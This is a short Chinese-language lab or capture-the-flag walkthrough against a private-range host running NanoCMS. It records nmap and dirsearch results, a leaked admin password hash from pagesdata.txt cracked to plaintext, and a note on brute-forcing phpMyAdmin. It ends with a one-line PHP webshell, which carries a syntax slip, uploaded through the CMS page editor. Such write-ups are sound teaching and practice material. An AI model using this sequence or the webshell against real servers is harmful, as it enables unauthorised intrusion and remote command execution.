1.
nmap -sn 192.168.2.1/24 快速扫描
发现主机

http://192.168.2.101/

url:
/~andy/ 博客 是个NanoCMS管理系统
/events/ 含登录框，注册框，找会密码框

contact 含留言板 



index.php?page=about 含任意文件遍历漏洞

有用户andy

后台登录页面
/~andy/data/nanoadmin.php

/mail/src/login.php

dirsearch扫描结果：
[00:15:38] 200 -  426B  - /inc/
[00:15:39] 200 -    2KB - /index.php
[00:15:39] 200 -    2KB - /index.php/login/
[00:15:39] 200 -   51KB - /info.php
[00:15:40] 301 -  312B  - /list  ->  http://192.168.2.101/list/
[00:15:40] 301 -  312B  - /mail  ->  http://192.168.2.101/mail/
[00:15:40] 302 -    0B  - /mail/  ->  src/login.php
[00:15:43] 301 -  318B  - /phpmyadmin  ->  http://192.168.2.101/phpmyadmin/
[00:15:43] 200 -    8KB - /phpmyadmin/

phpmyadmin可能存在弱密码爆破危险

info.php 显示php相关配置

list/index.php可以注册

mail/ 邮箱系统为SquirrelMail 


整理一下
/~andy/ 
/mail/
/list/
/events/

通过NanoCMS可以发现存在历史漏洞，敏感信息信息泄露。
后台为data/nanoadmin.php,
data/pagesdata.txt可以发现序列化后的数据。
账号:admin密码:9d2f75377ac0ab991d40c91fd27e52fd
将密码解密后得shannon

登录后发现登录成功,可以任意增删改查文件.
New 一个page，发现创建了一个php文件，所以可以上传webshell


<?php system($_GET['cmd'));?>